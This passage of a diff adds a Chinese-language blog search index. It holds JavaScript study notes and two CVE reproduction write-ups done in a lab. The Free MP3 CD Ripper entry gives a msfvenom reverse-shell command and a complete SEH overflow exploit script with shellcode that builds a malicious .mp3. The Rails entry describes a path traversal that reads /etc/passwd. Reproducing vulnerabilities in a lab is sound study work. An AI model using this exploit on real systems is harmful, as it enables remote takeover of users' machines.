class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Facebook&#x27;</span>); <span class="comment">// 返回[],因为没有删除任何元素</span></span><br><span class="line">arr; <span class="comment">// [&#x27;Microsoft&#x27;, &#x27;Apple&#x27;, &#x27;Google&#x27;, &#x27;Facebook&#x27;, &#x27;Oracle&#x27;]</span></span><br></pre></td></tr></table></figure></blockquote><p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> JS学习笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> JavaScript </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>JS笔记(0X01)</title>
+      <link href="2020/08/25/JS%E7%AC%94%E8%AE%B0(0X01)/"/>
+      <url>2020/08/25/JS%E7%AC%94%E8%AE%B0(0X01)/</url>
+      
+        <content type="html"><![CDATA[<h2 id="JS-简介"><a href="#JS-简介" class="headerlink" title="JS 简介"></a>JS 简介</h2><blockquote><p><strong>前端安全</strong></p><p><strong>解释性语言</strong></p><p><strong>每次刷新页面，JS都会执行一次</strong> </p><p><strong>从上到下依次执行</strong></p><p><strong>JS一般都放在<head>标签内</strong></p></blockquote><h2 id="简单输出语句："><a href="#简单输出语句：" class="headerlink" title="简单输出语句："></a>简单输出语句：</h2><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">**alert();**<span class="comment">//弹窗</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log;<span class="comment">//在控制台输出</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="如何在HTML中引入JS代码"><a href="#如何在HTML中引入JS代码" class="headerlink" title="如何在HTML中引入JS代码"></a>如何在HTML中引入JS代码</h3><ul><li><p>内部JS</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>外部JS</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=./xxx.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1、[]</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3.14</span>, <span class="string">&#x27;Hello&#x27;</span>, <span class="literal">null</span>, <span class="literal">true</span>];</span><br><span class="line"><span class="comment">//2、Array函数</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>); <span class="comment">// 创建了数组[1, 2, 3]</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><blockquote><p>JavaScript的对象是一组由键-值组成的无序集合，例如：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    name: <span class="string">&#x27;Bob&#x27;</span>,</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">    tags: [<span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;mobile&#x27;</span>],</span><br><span class="line">    city: <span class="string">&#x27;Beijing&#x27;</span>,</span><br><span class="line">    hasCar: <span class="literal">true</span>,</span><br><span class="line">    zipcode: <span class="literal">null</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>键：都是字符串类型</p><p>值：任意数据类型</p></blockquote><blockquote><h4 id="属性获取："><a href="#属性获取：" class="headerlink" title="属性获取："></a>属性获取：</h4><p>要获取一个对象的属性，我们用<code>对象变量.属性名</code>的方式：</p></blockquote><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">person.name; <span class="comment">// &#x27;Bob&#x27;</span></span><br><span class="line">person.zipcode; <span class="comment">// null</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a; <span class="comment">// 申明了变量a，此时a的值为undefined</span></span><br><span class="line"><span class="keyword">var</span> $b = <span class="number">1</span>; <span class="comment">// 申明了变量$b，同时给$b赋值，此时$b的值为1</span></span><br><span class="line"><span class="keyword">var</span> s_007 = <span class="string">&#x27;007&#x27;</span>; <span class="comment">// s_007是一个字符串</span></span><br><span class="line"><span class="keyword">var</span> Answer = <span class="literal">true</span>; <span class="comment">// Answer是一个布尔值true</span></span><br><span class="line"><span class="keyword">var</span> t = <span class="literal">null</span>; <span class="comment">// t的值是null</span></span><br></pre></td></tr></table></figure><blockquote><p>变量可以重新赋值，但是不可转型赋值，例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">123</span>; <span class="comment">// a的值是整数123</span></span><br><span class="line">a = <span class="string">&#x27;ABC&#x27;</span>; <span class="comment">// a变为字符串</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a = <span class="number">123</span>; <span class="comment">// a是整数类型变量，类型用int申明</span></span><br><span class="line">a = <span class="string">&quot;ABC&quot;</span>; <span class="comment">// 错误：不能把字符串赋给整型变量</span></span><br></pre></td></tr></table></figure><p>赋值变量的时候尽量要赋值为<code>var a = 123;</code> ，因为如果不加<code>var</code>就会变成全局变量，例如 <code>i = 123;</code> 。</p><p><strong>全局变量</strong>的意思就是如果一个<code>HTML</code>中引用了多个<code>js</code>，而恰好有多个js使用了相同的全局变量名，就会发生冲突，例如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.js</span></span><br><span class="line">i = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.js</span></span><br><span class="line">i = <span class="number">20</span>;</span><br></pre></td></tr></table></figure><p>当这两个<code>js</code>都被同一个<code>HTML</code>引用时就会发生冲突。</p></blockquote><p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> JS学习笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> JavaScript </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>(CVE-2019-9766)Free MP3 CD Ripper缓冲区溢出远程代码执行漏洞复现</title>
+      <link href="2020/08/25/CVE-2019-9766/"/>
+      <url>2020/08/25/CVE-2019-9766/</url>
+      
+        <content type="html"><![CDATA[<h1 id="CVE-2019-9766-Free-MP3-CD-Ripper缓冲区溢出远程代码执行漏洞复现"><a href="#CVE-2019-9766-Free-MP3-CD-Ripper缓冲区溢出远程代码执行漏洞复现" class="headerlink" title="(CVE-2019-9766)Free MP3 CD Ripper缓冲区溢出远程代码执行漏洞复现"></a>(CVE-2019-9766)Free MP3 CD Ripper缓冲区溢出远程代码执行漏洞复现</h1><h2 id="漏洞简介："><a href="#漏洞简介：" class="headerlink" title="漏洞简介："></a><strong>漏洞简介：</strong></h2><blockquote><p>Free MP3 CD Ripper是一款音频格式转换器。</p><p>Free MP3 CD Ripper 2.6版本中存在栈缓冲区溢出漏洞。远程攻击者可借助特制的.mp3文件利用该漏洞执行任意代码。</p></blockquote><h2 id="威胁类型"><a href="#威胁类型" class="headerlink" title="威胁类型"></a><strong>威胁类型</strong></h2><blockquote><p>远程代码执行</p></blockquote><h2 id="威胁等级"><a href="#威胁等级" class="headerlink" title="威胁等级"></a><strong>威胁等级</strong></h2><blockquote><p>高</p></blockquote><h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><blockquote><p>CVE-2019-9766</p></blockquote><h2 id="受影响系统及应用版本"><a href="#受影响系统及应用版本" class="headerlink" title="受影响系统及应用版本"></a>受影响系统及应用版本</h2><blockquote><p>Free MP3 CD Ripper 2.6</p></blockquote><h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a><strong>漏洞复现：</strong></h2><blockquote><p><strong>攻击机：kali2020 、kali2019</strong>  </p><p><strong>ip**</strong>：192.168.6.146** </p><p><strong>受害机：win10</strong>   </p><p><strong>ip**</strong>：192.168.6.142**</p><p><strong>安装Free MP3 CD Ripper 2.6版本</strong></p></blockquote><h2 id="1、搭建环境"><a href="#1、搭建环境" class="headerlink" title="1、搭建环境"></a><strong>1、搭建环境</strong></h2><ul><li><strong>Win10</strong>下载安装Free MP3 CD Ripper 2.6版本</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756071.png!small"></p><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756090.png!small"></p><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756100.png!small"></p><ul><li><strong>利用msf生成反向连接的shellcode</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.6.146 lport&#x3D;888 -f c --smallest</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756107.png!small"></p><ul><li><p><strong>替换脚本中的shellcode.</strong></p></li><li><p><strong>编写生成.Mp3文件的脚本</strong></p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#Stack-based buffer overflow in Free MP3 CD Ripper 2.6</span><br><span class="line"></span><br><span class="line">buffer&#x3D;&quot;A&quot;*4116</span><br><span class="line">NSEH&#x3D;&quot;\xeb\x06\x90\x90&quot;</span><br><span class="line">SEH&#x3D;&quot;\x84\x20\xe4\x66&quot;</span><br><span class="line">nops&#x3D;&quot;\x90&quot;*5</span><br><span class="line">buf&#x3D;&quot;&quot;</span><br><span class="line">buf&#x3D;&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;</span><br><span class="line">buf&#x3D;&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span><br><span class="line">buf&#x3D;&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;</span><br><span class="line">buf&#x3D;&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;</span><br><span class="line">buf&#x3D;&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;</span><br><span class="line">buf&#x3D;&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;</span><br><span class="line">buf&#x3D;&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;</span><br><span class="line">buf&#x3D;&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;</span><br><span class="line">buf&#x3D;&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;</span><br><span class="line">buf&#x3D;&quot;\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c&quot;</span><br><span class="line">buf&#x3D;&quot;\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54&quot;</span><br><span class="line">buf&#x3D;&quot;\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x6e\x84&quot;</span><br><span class="line">buf&#x3D;&quot;\x68\x02\x00\x03\x78\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50&quot;</span><br><span class="line">buf&#x3D;&quot;\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5&quot;</span><br><span class="line">buf&#x3D;&quot;\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0&quot;</span><br><span class="line">buf&#x3D;&quot;\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8&quot;</span><br><span class="line">buf&#x3D;&quot;\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00&quot;</span><br><span class="line">buf&#x3D;&quot;\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68&quot;</span><br><span class="line">buf&#x3D;&quot;\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3&quot;;</span><br><span class="line"></span><br><span class="line">pad&#x3D;&quot;B&quot;*(316-len(nops)-len(buf))</span><br><span class="line">payload&#x3D;buffer+NSEH+SEH+nops+buf+pad</span><br><span class="line">try:</span><br><span class="line">    f&#x3D;open(&quot;Test_Free_MP3.mp3&quot;,&quot;w&quot;)</span><br><span class="line">    print (&quot;[+]Creating %s bytes mp3 Files...&quot;%len(payload))</span><br><span class="line">    f.write(payload)</span><br><span class="line">    f.close() </span><br><span class="line">    print (&quot;[+]mp3 File created successfully!&quot;)</span><br><span class="line">except:</span><br><span class="line"></span><br><span class="line">    print (&quot;File cannot be created!&quot;)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756330.png!small"></p><ul><li><strong>运行脚本，生成一个.MP3的文件</strong></li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756343.png!small"></p><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756349.png!small"></p><ul><li><strong>将生成的.mp3文件放到win10上（需要VMtools）</strong></li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756378.png!small"></p><ul><li><strong>kali</strong>开启msfconsole</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756395.png!small"></p><ul><li><p><strong>使用exploit/multi/handler模块</strong></p></li><li><p><strong>设置lhost,lport,攻击载荷</strong></p></li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756416.png!small"></p><ul><li><strong>Kali</strong>开启监听：</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756435.png!small"></p><ul><li><strong>Win10</strong>使用free MP3 CD ripper 打开mp3文件</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756451.png!small"></p><ul><li><strong>接收反弹的</strong>shell</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756479.png!small"></p><p><strong>执行命令</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595756510.png!small"></p><ul><li><strong>漏洞利用成功</strong></li></ul><blockquote><p><strong>PS: 说一个我踩的坑吧，真的头一次遇到这种情况:</strong></p><p>漏洞利用攻击机需要用kali2019版本，2020版本不可以利用。用2020试了好多遍都没有成功，最后鬼使神差的用了2019就成功了。有遇到过这样情况的大佬分享一下经验吗。</p></blockquote><h2 id="2、修复建议"><a href="#2、修复建议" class="headerlink" title="2、修复建议"></a><strong>2</strong>、修复建议</h2><p>及时更新Free MP3 CD Ripper到最新版本</p><p>参考链接：<a href="https://blog.csdn.net/weixin_46132680/article/details/104366335">https://blog.csdn.net/weixin_46132680/article/details/104366335</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CVE </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>(CVE-2019-5418)Ruby on Rails路径穿越与任意文件读取漏洞复现</title>
+      <link href="2020/08/23/CVE-2019-5418/"/>
+      <url>2020/08/23/CVE-2019-5418/</url>
+      
+        <content type="html"><![CDATA[<h2 id="漏洞简介："><a href="#漏洞简介：" class="headerlink" title="漏洞简介："></a><strong>漏洞简介：</strong></h2><blockquote><p>Ruby on Rails是一个web应用程序框架，是相对较新的web应用程序框架</p><p>构建在Ruby语言上</p></blockquote><h2 id="威胁类型"><a href="#威胁类型" class="headerlink" title="威胁类型"></a><strong>威胁类型</strong></h2><blockquote><p>远程代码执行，任意文件读取</p></blockquote><h2 id="威胁等级"><a href="#威胁等级" class="headerlink" title="威胁等级"></a><strong>威胁等级</strong></h2><blockquote><p>高</p></blockquote><h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a><strong>漏洞编号</strong></h2><blockquote><p>CVE-2019-5418</p></blockquote><h2 id="受影响系统及应用版本"><a href="#受影响系统及应用版本" class="headerlink" title="受影响系统及应用版本"></a><strong>受影响系统及应用版本</strong></h2><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Rails全版本</span><br><span class="line"></span><br><span class="line">其中修复版本</span><br><span class="line">6.0.0.beta3,</span><br><span class="line">5.2.2.1</span><br><span class="line">5.1.6.2</span><br><span class="line">5.0.7.2</span><br><span class="line">4.2.11.1</span><br></pre></td></tr></table></figure></blockquote><h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a><strong>漏洞复现：</strong></h2><h3 id="1、搭建环境"><a href="#1、搭建环境" class="headerlink" title="1、搭建环境"></a><strong>1</strong>、搭建环境</h3><p><strong>Ruby On Rails环境建设</strong></p><p><strong>1、安装git</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750537.png!small"></p><p><strong>2、安装rbenv到〜/ .rbenv目录</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750544.png!small"></p><p><strong>3、安装rbenv的插，用于编译安装ruby</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750551.png!small"></p><p><strong>4、用来管理 gemset, 可选, 因为有 bundler 也没什么必要</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750571.png!small"></p><p><strong>5、通过 gem 命令安装完 gem 后无需手动输入 rbenv rehash 命令</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750584.png!small"></p><p><strong>6、通过 rbenv update 命令来更新 rbenv 以及所有插件</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750598.png!small"></p><p><strong>7、使用 Ruby China 的镜像安装 Ruby, 国内用户推荐</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750612.png!small"></p><p><strong>8、然后需要将下面两句代码放在bash的配置文件中：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750623.png!small"></p><p><strong>9、执行下面的命令使其生效</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure><p><strong>10、安装ruby</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750690.png!small"></p><p><strong>11、在demo路径下执行“rails s”,开启服务</strong></p><p><strong>指定9876端口</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750703.png!small"></p><p><strong>12、访问“chybeta”路径：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750723.png!small"></p><p><strong>13、我们使用浏览器自带的开发者工具进行漏洞复现，按“f12”打开工具，修改这条请求，修改内容如下：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750741.png!small"></p><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750756.png!small"></p><p><strong>14、漏洞复现成功，成功读取到passwd文件的内容：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20200726/1595750771.png!small"></p><h2 id="2、修复建议"><a href="#2、修复建议" class="headerlink" title="2、修复建议"></a><strong>2</strong>、修复建议</h2><ol><li><h3 id="使用已经修复该漏洞的版本"><a href="#使用已经修复该漏洞的版本" class="headerlink" title="使用已经修复该漏洞的版本"></a>使用已经修复该漏洞的版本</h3></li></ol><p>参考链接：<a href="https://www.sohu.com/a/306334931_354899">https://www.sohu.com/a/306334931_354899</a></p><p>ps：<a href="https://www.sohu.com/a/306334931_354899">参考链接</a>这篇文章讲解的非常细，对我在本漏洞复现过程中的理解有很大帮助，先给大佬跪了。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CVE </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
